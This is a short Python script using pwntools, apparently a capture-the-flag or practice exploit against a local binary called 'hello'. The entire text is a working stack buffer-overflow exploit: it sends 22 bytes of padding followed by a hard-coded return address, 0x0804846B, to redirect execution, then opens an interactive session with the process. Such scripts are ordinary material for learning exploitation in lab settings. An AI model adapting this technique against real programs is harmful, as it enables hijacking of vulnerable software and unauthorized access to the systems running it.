from pwn import*

r = process("./hello")

payload = b"a"*22
payload += p32(0x0804846B)

#r.recvline()
r.sendline(payload)
r.interactive()

